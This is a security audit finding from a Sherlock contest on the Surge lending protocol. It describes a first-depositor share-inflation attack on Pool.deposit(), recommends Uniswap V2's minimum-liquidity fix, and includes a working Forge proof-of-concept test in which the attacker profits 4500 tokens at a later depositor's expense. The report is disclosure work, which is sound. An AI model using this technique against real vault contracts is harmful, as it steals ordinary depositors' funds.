Bobface

high

# First depositor can steal funds from subsequent depositors

## Summary
The first pool depositor can deposit a very minimal amount of tokens, such as 1 wei, followed by sending a larger amount of funds directly to the pool contract. If calculated correctly, this results in the attacker being able to withdraw parts of the later depositor's funds.

## Vulnerability Detail
[`Pool.deposit()`](https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L307) handles user loan token deposits. The method takes the amount of tokens to be deposited as argument `amount` and credits the corresponding amount of shares / LP tokens. In the special case of a deposit being the first deposit, [`tokenToShares()`](https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L199) will use a different formula for the LP token calculation, and the depositor simply gets the amount of tokens deposited credited as LP tokens, [`shares = tokenAmount`](https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L200).

## Impact
A bad actor can abuse this behaviour by depositing a very small amount, such as 1 wei, as the first deposit, and then sending a larger amount of tokens directly to the vault:
1. Deposit 1 wei of token and receive 1 wei of LP token
2. Send 10 full tokens directly to the vault. 1 wei of LP token is now worth 10 full tokens (plus 1 wei)
3. A normal user deposits 19 full tokens, meaning he would receive `19 * 1 / 10 = 1.99999...` wei LP tokens, but the value gets rounded down to `1` wei LP tokens.
4. The attacker withdraws his one wei share, and since there are only two wei total shares, gets half of the 29 tokens deposited: 14.5 tokens, even though he only deposited 10 tokens previously 

This attack would work best in practice by sandwiching a first deposit transaction since the values can be exactly calculated to be the most profitable. 

## Recommendation
Uniswap V2 [solves this problem](https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/UniswapV2Pair.sol#L119-L121) by a) requiring the initial deposit to have a certain minimum size and b) send the first 1000 wei of LP tokens to the zero address:

```solidity
if (_totalSupply == 0) {
    liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);
    _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens
}
```

I recommend the same solution in this case. 

## Tool used

Manual Review

## Code Snippet
The PoC is implemented as Forge test. Add the following code as `ExploitShares.t.sol` to `/test` and run it using `forge test -m testExploitShares -vv`. You should see output similar to this:
```bash
Running 1 test for test/ExploitShares.t.sol:ExploitShares
[PASS] testExploitShares() (gas: 6380417)
Logs:
  Bad User: Profit of 4500 tokens
  Good User: Loss of 4500 tokens
```

Code:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";

import "../src/Pool.sol";
import "../src/Factory.sol";

contract ExploitShares is Test {
    function testExploitShares() external {
        // Deploy the loan token
        TestingERC20 loanToken = new TestingERC20();

        // Deploy the factory
        Factory factory = new Factory(address(this), "test");

        // Deploy the pool
        Pool pool = factory.deploySurgePool(
            IERC20(address(0)),
            IERC20(address(loanToken)),
            1,
            1,
            1,
            1,
            1,
            1,
            1
        );

        // Execute bad user's first transaction:
        // - Deposit 1 wei
        // - Directly transfer 9_999 full tokens to the pool
        User badUser = new User(pool, loanToken);
        badUser.deposit(1);
        badUser.directTransfer(9_999 ether);

        // Good user's transaction is executed, depositing 19_000 tokens
        User goodUser = new User(pool, loanToken);
        goodUser.deposit(19_000 ether);

        // Bad user withdraws
        badUser.withdrawAll();

        // Good user withdraws
        goodUser.withdrawAll();

        // Print results
        badUser.print("Bad User");
        goodUser.print("Good User");
    }
}

contract User {
    Pool pool;
    TestingERC20 loanToken;
    uint256 deposited;
    uint256 withdrawn;

    constructor(Pool _pool, TestingERC20 _loanToken) {
        pool = _pool;
        loanToken = _loanToken;
    }

    function deposit(uint256 amount) external {
        loanToken.mint(address(this), amount);
        pool.deposit(amount);
        deposited += amount;
    }

    function withdrawAll() external {
        uint256 balanceBefore = loanToken.balanceOf(address(this));
        pool.withdraw(type(uint256).max);
        withdrawn = loanToken.balanceOf(address(this)) - balanceBefore;
    }

    function directTransfer(uint256 amount) external {
        loanToken.mint(address(this), amount);
        loanToken.transfer(address(pool), amount);
        deposited += amount;
    }

    function print(string memory name) external view {
        if (withdrawn <= deposited) {
            console.log(
                "%s: Loss of %s tokens",
                name,
                (deposited - withdrawn) / 1 ether
            );
        } else {
            console.log(
                "%s: Profit of %s tokens",
                name,
                (withdrawn - deposited) / 1 ether
            );
        }
    }
}

contract TestingERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address addr, uint256 amount) external {
        balanceOf[addr] += amount;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        transferFrom(msg.sender, to, amount);
    }
}

```
